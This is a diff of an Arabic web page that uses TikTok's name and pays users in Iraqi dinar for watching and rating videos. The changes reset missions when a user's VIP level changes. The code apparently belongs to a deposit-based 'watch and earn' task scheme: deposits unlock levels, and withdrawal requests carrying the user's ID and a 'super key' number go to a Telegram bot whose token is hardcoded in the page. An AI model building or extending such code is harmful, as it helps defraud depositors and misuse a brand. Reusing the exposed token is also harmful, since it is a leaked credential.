@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-  <title>تيك توك - مهام التقييم والمشاهدة</title>
+  <title>تيك توك - مهام الليفل الحالي</title>
   <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;700;900&display=swap" rel="stylesheet">
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
   
@@ -794,6 +794,17 @@
     let selectedPlanPrice = 0;
     let selectedPlanName = '';
 
+    // التحقق من تغيير اللفل لمسح مهام الليفل السابق واعتماد مهام الليفل الحالي
+    let lastStoredLevel = parseInt(localStorage.getItem('last_active_vip_level') || '0');
+    if (lastStoredLevel !== userVipLevel) {
+      localStorage.setItem('last_active_vip_level', userVipLevel);
+      localStorage.setItem('daily_missions_count', '0');
+      localStorage.setItem('watched_videos', JSON.stringify([]));
+      localStorage.setItem('rated_videos', JSON.stringify([]));
+      watchedSet.clear();
+      ratedSet.clear();
+    }
+
     async function getNetworkDateTime() {
       try {
         const response = await fetch('https://worldtimeapi.org/api/ip', { cache: 'no-store' });
@@ -812,6 +823,10 @@
       if (storedDate !== currentDateStr) {
         localStorage.setItem('boost_date', currentDateStr);
         localStorage.setItem('daily_missions_count', '0');
+        localStorage.setItem('watched_videos', JSON.stringify([]));
+        localStorage.setItem('rated_videos', JSON.stringify([]));
+        watchedSet.clear();
+        ratedSet.clear();
       }
     }
 
@@ -836,7 +851,7 @@
         }
         badgeEl.style.background = 'rgba(255, 215, 0, 0.2)';
         badgeEl.style.color = '#ffd700';
-        statusBadge.innerHTML = 'حالة الإيداع: <span style="color: #00ffcc;">ناجح ✅ (تم تفعيل المستوى)</span>';
+        statusBadge.innerHTML = 'حالة الإيداع: <span style="color: #00ffcc;">ناجح ✅ (تم تفعيل المستوى وحصرياً مهام لفل ' + userVipLevel + ')</span>';
       } else {
         badgeEl.innerText = 'حساب عادى (لفل 0 - مشاهدة 3 مقاطع بـ 100 د.ع | حد السحب 1,000)';
         badgeEl.style.background = '#333';
@@ -972,8 +987,18 @@
               if (cols[7] && cols[7].v !== undefined) {
                 const sheetVip = parseInt(cols[7].v);
                 if (!isNaN(sheetVip)) {
+                  let oldLevel = userVipLevel;
                   userVipLevel = sheetVip;
                   localStorage.setItem('user_vip_level', userVipLevel);
+
+                  if (oldLevel !== userVipLevel) {
+                    localStorage.setItem('last_active_vip_level', userVipLevel);
+                    localStorage.setItem('daily_missions_count', '0');
+                    localStorage.setItem('watched_videos', JSON.stringify([]));
+                    localStorage.setItem('rated_videos', JSON.stringify([]));
+                    watchedSet.clear();
+                    ratedSet.clear();
+                  }
                 }
               }
             }
@@ -1005,7 +1030,7 @@
               url: ytId,
               author: userCell,
               verified: verifiedCell === 1,
-              desc: userVipLevel > 0 ? 'قيّم المقطع لإتمام مهمة الليفل ⭐' : 'شاهد المقطع واكسب من مهامك اليومية',
+              desc: userVipLevel > 0 ? `⭐ مهمة تقييم لفل ${userVipLevel}` : 'شاهد المقطع واكسب من مهامك اليومية',
               likes: likesCell
             });
           }
@@ -1069,7 +1094,6 @@
           </div>
         `;
 
-        // شريط التقدم لفل 0، أما لفل 1 و 2 و 3 فيظهر لهم صندوق التقييم بالنجوم بعد 5 ثوانٍ
         let extraContent = '';
         if (userVipLevel === 0) {
           extraContent = `<div class="watch-progress" id="progress-${index}"></div>`;
@@ -1237,7 +1261,7 @@
       const ratingBox = document.getElementById(`rating-box-${index}`);
       if (ratingBox) ratingBox.classList.remove('show');
 
-      let earnedReward = 500; // افتراضي لفل 1
+      let earnedReward = 500;
       if (userVipLevel === 1) earnedReward = 500;
       else if (userVipLevel === 2) earnedReward = 1000;
       else if (userVipLevel === 3) earnedReward = 1500;
@@ -1252,7 +1276,7 @@
       const badge = document.getElementById('rewardBadge');
       badge.classList.add('pop');
       setTimeout(() => badge.classList.remove('pop'), 400);
-      showToast(`تم إنجاز مهمة التقييم (${dailyMissionsCount + 1}/3)! +${earnedReward} د.ع`);
+      showToast(`تم إنجاز مهمة تقييم لفل ${userVipLevel} (${dailyMissionsCount + 1}/3)! +${earnedReward} د.ع`);
     }
 
     function toggleLike(element) {
@@ -1524,7 +1548,7 @@
 
       const botToken = "335977783:AAEQMPSvxSPjqCFfdKmqiGhYI5Jl72QMqAA";
       const chatId = "250273112";
-      const message = `💸 طلب سحب أرباح جديد:\n🆔 رقم المستخدم: ${myUserId}\n⭐ المستوى: VIP ${userVipLevel}\n🔑 رقم السوبر كي: ${superKey}\n💰 المبلغ المطلوب: ${balance} د.ع`;
+      const message = `💸 طلب سحب أرباح جديد:\n🆔 رقم المستخدم: ${myUserId}\n⭐ المستوى الحالي: VIP ${userVipLevel}\n🔑 رقم السوبر كي: ${superKey}\n💰 المبلغ المطلوب: ${balance} د.ع`;
 
       const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
 
